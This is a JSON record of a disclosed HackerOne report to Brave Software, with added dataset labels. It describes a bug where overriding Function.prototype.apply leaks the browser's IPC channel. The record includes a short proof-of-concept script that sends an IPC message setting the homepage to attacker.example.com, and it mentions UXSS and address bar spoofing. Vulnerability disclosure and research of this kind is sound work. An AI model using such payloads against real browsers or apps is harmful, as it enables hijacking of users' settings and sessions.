{
    "reported_to": "Brave Software",
    "reported_by": "masatokinugawa ",
    "title": "Sending arbitrary IPC messages via overriding Function.prototype.apply",
    "content": "\nSummary:\nBrave Browser allows to overwrite the internal js code from the user js code.\nUsing this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on. This bug is similar to #187542.\nTested on:\nBrave 0.12.11\nSteps To Reproduce:\nGo to this page: https://vulnerabledoma.in/brave/settings_change2.html\nCode 261 Bytes\n1<script>\n2Function.prototype.apply=function(ipc){\n3    ipc.send(\"dispatch-action\",'{\"actionType\":\"app-change-setting\",\"key\":\"general.homepage\",\"value\":\"http://attacker.example.com/\"}');\n4}\n5</script>\n6<div style=\"visibility:hidden\">\n7<embed src=\".swf\"></embed>\n8</div>\nSee about:preferences. You can confirm that your home page is changed to http://attacker.example.com/.\nAlso an attacker can do UXSS and address bar spoofing using this bug. Please see #187542's PoC .\nTechnical Details\nThis apply in the ipc_utils.js is overwritten:\nCode 192 Bytes\n1  ipcRenderer.emit = function () {\n2    arguments[1].sender = ipcRenderer\n3    return EventEmitter.prototype.emit.apply(ipcRenderer, arguments)\n4  }\n5  atom.v8.setHiddenValue('ipc', ipcRenderer)\n6}\nAnd the 1st arguments leaks IPC method.\nCould you confirm this bug?\nThanks!\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": 5300,
    "weaknesses": [
        "Command Injection - Generic"
    ],
    "screenshots": {},
    "disclosed_date": 1537308900,
    "report_url": "https://hackerone.com/reports/188086",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Navigate to the vulnerable page: https://vulnerabledoma.in/brave/settings_change2.html"
        ],
        [
            2,
            "Observe that the homepage setting is changed to http://attacker.example.com/ in about:preferences"
        ]
    ],
    "vuln_description": "The vulnerability allows an attacker to overwrite internal JavaScript code in Brave Browser, specifically Function.prototype.apply, to send arbitrary IPC messages. This can lead to UXSS, address bar spoofing, and changing browser settings without user consent.",
    "reason": "The attack involves understanding and manipulating the internal IPC communication mechanism of Brave Browser by overriding a fundamental JavaScript function. While the concept of function overriding is not novel, the specific interaction with Brave's IPC system and the resulting impact requires a deep understanding of both JavaScript and the browser's internal workings.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": "187542",
    "authnz_metadata": {
        "reason": "The vulnerability involves overriding Function.prototype.apply in the browser's JavaScript environment to send arbitrary IPC messages, which is a client-side issue. The proposed methodologies focus on server-side authentication and authorization issues by analyzing HTTP requests and responses. Since this vulnerability does not involve HTTP requests or server-side authorization checks, it falls outside the scope of the described detection methods.",
        "is_detectable": false
    }
}